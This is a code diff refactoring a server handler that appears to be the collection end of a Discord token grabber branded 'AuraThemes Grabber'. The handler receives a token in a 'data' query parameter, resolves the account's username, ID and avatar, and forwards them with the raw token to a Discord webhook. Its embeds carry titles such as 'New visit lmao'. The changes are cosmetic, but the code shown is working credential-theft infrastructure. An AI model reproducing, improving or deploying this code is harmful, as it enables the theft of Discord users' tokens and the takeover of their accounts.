@@ -1,6 +1,6 @@
 import { EmbedBuilder, WebhookClient } from 'discord.js';
 import DiscordToken from 'discord.js-token';
-import k4itrunConfig from '../../../../k4itrun.config';
+import k4itrunConfig from '../../../../k4itrun.config'
 
 const webhook = new WebhookClient({
   url: k4itrunConfig.webhook,
@@ -14,7 +14,6 @@ const EMBED_COLORS = {
 export default async function handler(req, res) {
   try {
     const { query } = req;
-
     if (!query.data) {
       res.status(400).send('Bad Request: Missing "data" query parameter');
       return;
@@ -29,6 +28,7 @@ export default async function handler(req, res) {
     });
 
     const info = await response.json();
+
     console.log(info);
 
     const Discord = new DiscordToken(data).info;
@@ -41,7 +41,6 @@ export default async function handler(req, res) {
       username: '@AuraThemes',
       avatarURL: embed.avatar,
     });
-
     res.status(200).send(data);
   } catch (error) {
     console.error('Error:', error);
@@ -49,22 +48,28 @@ export default async function handler(req, res) {
   }
 }
 
-function getField(name = '-', value = '-', inline = false) {
+function getField(a = null, b = null, c = false) {
+  let name = a;
+  let value = b;
+  let inline = c;
+  if (!name || name.length < 1) name = '-';
+  if (!value || value.length < 1) value = '-';
   return { name, value, inline };
 }
 
 function buildRawEmbed(data, embed) {
-  return new EmbedBuilder()
+  const rawEmbed = new EmbedBuilder()
     .setAuthor({ name: 'AuraThemes' })
     .setColor(EMBED_COLORS.raw)
     .setTitle('raw')
     .addFields(getField('New visit lmao', `\`\`\`${data}\`\`\``))
     .setFooter({ text: 'AuraThemes API', iconURL: embed.footericon })
     .setTimestamp();
+  return rawEmbed;
 }
 
 function buildInitializedEmbed(Discord, data, embed) {
-  return new EmbedBuilder()
+  const initializedEmbed = new EmbedBuilder()
     .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
     .setThumbnail(Discord.avatar)
     .setColor(EMBED_COLORS.initialized)
@@ -79,18 +84,13 @@ function buildInitializedEmbed(Discord, data, embed) {
     )
     .setFooter({ text: 'AuraThemes Grabber', iconURL: embed.footericon })
     .setTimestamp();
+  return initializedEmbed;
 }
 
 async function getEmbed() {
-  const embed = {
-    avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
-    discord: 'https://discord.gg/aurathemes',
-    footer_url: 'https://i.imgur.com/WkKXZSl.gif',
-  };
-
   return {
-    avatar: embed.avatar_url,
-    url: embed.discord,
-    footericon: embed.footer_url,
+    avatar: 'https://i.imgur.com/WkKXZSl.gif',
+    url:  'https://discord.gg/aurathemes',
+    footericon: 'https://i.imgur.com/WkKXZSl.gif',
   };
 }
